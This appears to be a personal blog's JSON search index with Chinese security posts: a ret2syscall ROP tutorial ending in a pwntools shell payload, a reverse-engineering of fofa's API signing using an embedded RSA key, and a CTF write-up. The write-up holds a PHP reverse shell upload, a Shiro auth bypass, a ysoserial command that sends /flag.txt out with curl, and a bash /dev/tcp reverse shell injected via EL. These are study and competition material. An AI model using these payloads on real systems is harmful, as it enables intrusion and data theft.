{"pages":[],"posts":[{"title":"Hello World","text":"Nya~","link":"/2020/12/27/hello-world/"},{"title":"syscall&amp;ret2syscall学习笔记","text":"使用checksec检查保护 1234567checksec rop [*] 'rop' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 丢进IDA查看源码 123456789101112int __cdecl main(int argc, const char **argv, const char **envp){ char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(s); strncpy(buf2, s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;} 使用GEF计算偏移量 123456789101112131415161718192021222324252627282930313233343536373839gdb -q rop Reading symbols from rop...gdb-peda$ pattern create 200'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'gdb-peda$ rStarting program: /home/qwq/pwn/rop This time, no system() and NO SHELLCODE!!!What do you plan to do?AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAProgram received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0xfbad2288 EDX: 0x80eb4e0 --&gt; 0x0 ESI: 0x0 EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EBP: 0x6941414d ('MAAi')ESP: 0xffffd020 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)EIP: 0x41384141 ('AA8A')EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41384141[------------------------------------stack-------------------------------------]0000| 0xffffd020 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0004| 0xffffd024 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0008| 0xffffd028 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0012| 0xffffd02c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0016| 0xffffd030 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0020| 0xffffd034 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0024| 0xffffd038 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)0028| 0xffffd03c (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41384141 in ?? ()gdb-peda$ pattern offset AA8AAA8A found at offset: 112 手动计算也是可以的（当然手动计算只是为了了解原理，用工具算更方便）在IDA中找到call gets的位置，设置断点并运行 123.text:08048E8F lea eax, [esp+1Ch].text:08048E93 mov [esp], eax.text:08048E96 call gets 1234567891011121314151617gdb-peda$ b *0x08048E96Breakpoint 1 at 0x8048e96: file rop.c, line 15.gdb-peda$ rStarting program: rop This time, no system() and NO SHELLCODE!!!What do you plan to do?[----------------------------------registers-----------------------------------]EAX: 0xffffcfac --&gt; 0x3 EBX: 0x80481a8 (&lt;_init&gt;: push ebx)ECX: 0x80eb4d4 --&gt; 0x0 EDX: 0x18 ESI: 0x0 EDI: 0x80ea00c --&gt; 0x8067b10 (&lt;__stpcpy_sse2&gt;: mov edx,DWORD PTR [esp+0x4])EBP: 0xffffd018 --&gt; 0x8049630 (&lt;__libc_csu_fini&gt;: push ebx)ESP: 0xffffcf90 --&gt; 0xffffcfac --&gt; 0x3 EIP: 0x8048e96 (&lt;main+114&gt;: call 0x804f650 &lt;gets&gt;)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) 可以看到ESP为0xffffcf90，s为0xffffcfac，EBP为0xffffd0180xffffd018-0xffffcfac+4得到偏移量112我们要执行的内容是 123execve(&quot;/bin/sh&quot;,NULL,NULL)相当于int 0x80(eax,ebx,ecx,edx) 该程序是32位，所以我们需要使得系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0那么要如何控制这些寄存器的值呢？如果栈顶是1，pop eax之后eax的值就会变为1。这里就需要使用对应操作的gadgets了。先找出pop eax然后ret的gadgets 123456ROPgadget --binary rop --only 'pop|ret' | grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 这里使用最简单的第二个来作为gadgets同理，我们还需要找出控制另外三个寄存器的gadgets 12345678910111213141516171819202122232425262728ROPgadget --binary rop --only 'pop|ret' | grep 'ebx'0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret0x080be23f : pop ebx ; pop edi ; ret0x0806eb69 : pop ebx ; pop edx ; ret0x08092258 : pop ebx ; pop esi ; pop ebp ; ret0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x100x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x140x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 40x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 80x08048913 : pop ebx ; pop esi ; pop edi ; ret0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 40x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret0x0805c820 : pop esi ; pop ebx ; ret0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0807b6ed : pop ss ; pop ebx ; ret 发现这里的0x0806eb90可以直接控制edx，ecx，ebx三个寄存器，比较方便，于是直接选用这个作为gadgets然后还需要找出”/bin/sh”和int 0x80 的地址 1234567891011ROPgadget --binary rop --string &quot;/bin/sh&quot; Strings information============================================================0x080be408 : /bin/shROPgadget --binary rop --only 'int' Gadgets information============================================================0x08049421 : int 0x80Unique gadgets found: 1 然后就可以写出对应的payload了 123456789from pwn import *pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421bin_sh = 0x80be408payload = b'A'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)print(payload)sh.sendline(payload)sh.interactive() 成功getshell 12345678[+] Starting local process './rop': pid 1768271b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x96\\xb1\\x0b\\x08\\x0b\\x00\\x00\\x00\\x90\\xeb\\x06\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\xe4\\x0b\\x08!\\x94\\x04\\x08'[*] Switching to interactive modeThis time, no system() and NO SHELLCODE!!!What do you plan to do?$ whoamiqwq$","link":"/2021/01/16/syscall-ret2syscall%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"fofa API 签名逆向","text":"某天准备用自己抓包写的脚本爬一些fofa上的数据时，发现出错了 12345{ &quot;code&quot;: -9, &quot;message&quot;: &quot;[-9] API校验密匙错&quot;, &quot;data&quot;: &quot;&quot;} 经过抓包，发现请求多了ts sign app_id 三个参数，关键是sign 尝试通过追踪请求的调用栈和搜索关键词，在webpack js源码中找到签名的代码 发现这里有一串RSA private key，调用sortFun进行签名 找到sortFun 对代码进行修改以方便调试和查看效果 可以看到签名的字符串是把url中的所有参数和值拼接在一起 123456echo -n &quot;fullfalseqbase64cHJvdG9jb2w9Imh0dHAits1652105964318&quot; | openssl dgst -sha256 -sign fofa_rsa.pem | base64X2gz9o3GrWhKim51dO5QB0nz2XJLCCP5T9jJxn3TXZH7NLNy75enVvb8JMoIbCJuEuoM1HdI6nd2YdGn7Ag26lnZoUNQy/4l+0ff66mvaxl+iidthKV/MaINvFSewlteGCzwekx0IbiOS4HABmOBCfqG2HzAb+Eqo/olWoDcNmJSaW9f4f1W0bpQNoB9XCHL5Jsq89AwG/5hrbdKXCZu93f9sFdHszw7kZGQkqBgPm/SJ7hJnukCMWBB6GF7eotOGx524RMGO/LKiDBb9g3dUNGa4H1op6AW5WpaeRQT2CPTpjLkqVZYaG7bO6t2zO3ltcg6ajTIplVfgtIbu/ZvqQ== 验证成功 py脚本 123qbase64 = base64.b64encode(q.encode()).decode()for_sign = &quot;fullfalsepage%sq%sqbase64%ssize10&quot;%(i,q,qbase64)sign = urllib.parse.quote(base64.b64encode(rsa.sign_hash(rsa.compute_hash(for_sign.encode(), 'SHA-256'), privkey, 'SHA-256')).decode(),safe=&quot;&quot;)","link":"/2021/07/21/fofa-API-%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/"},{"title":"黑盾杯2022线上writeup","text":"Do you securedirsearch扫到upload.php 条件竞争 1234567891011121314151617181920import requestsfiles = {'pic':('ma.php', '''&lt;?php$sock = fsockopen(&quot;xxx&quot;, &quot;9999&quot;);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open('/bin/sh', $descriptorspec, $pipes);proc_close($process);''', 'image/png')}r = requests.post(&quot;http://39.104.68.128:24430/upload.php&quot;,files=files)print(r.text)res = r.text[r.text.find(&quot;/upload/&quot;):r.text.find(&quot;&lt;br&gt;&quot;)]print(res)r = requests.get(&quot;http://39.104.68.128:24430&quot;+res)print(r.text) 获得反弹shell，拿到flag the word is not the word将doc文件命名为.zip文件 解压后 打开word目录下的document.xml 在文件末尾发现类似flag用{}包裹字符串 看不见不等于没有 转为16进制，发现全部都是20和09，猜测为二进制编码 将20和09分别替换成0和1，解码获得flag HeidunGame使用d2j-dex2jar,得到classes-dex2jar.jar，用JD-GUI打开 在com.example.heidungame.data.LoginDataSource找到flag EzJava扫到 http://39.104.68.128:8301/login ，访问提示/json，访问/json又跳回login 附件是个pom.xml 123456789101112131415161718192021222324252627&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-web&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-core&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; shiro1.5.1版本存在权限绕过漏洞CVE-2020-11989，访问/aaaa/..;/json成功绕过 fuzz发现可能存在Jackson反序列化 使用jndi注入rce，getshell 1java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 2334 CommonsCollections5 &quot;curl xxx:9999 -F file=@/flag.txt&quot; ezwebweb在 http://39.104.68.128:5748/index/feedBack 抓包发现 /validateBody CVE-2020-11989 123456789101112131415POST /validateBody HTTP/1.1Host: 39.104.68.128:5748Content-Length: 196Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36Content-Type: application/jsonOrigin: http://39.104.68.128:5748Referer: http://39.104.68.128:5748/index/feedBackAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: JSESSIONID=53641AF424B14F49A193187416A5214CConnection: close {&quot;username&quot;:&quot;1&quot;,&quot;tel&quot;:&quot;1&quot;,&quot;email&quot;:&quot;$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/xxx/9999&lt;&amp;1')}&quot;,&quot;yourworks&quot;:&quot;&quot;} 反弹shell拿到flag","link":"/2022/09/26/%E9%BB%91%E7%9B%BE%E6%9D%AF2022%E7%BA%BF%E4%B8%8Awriteup/"}],"tags":[],"categories":[]}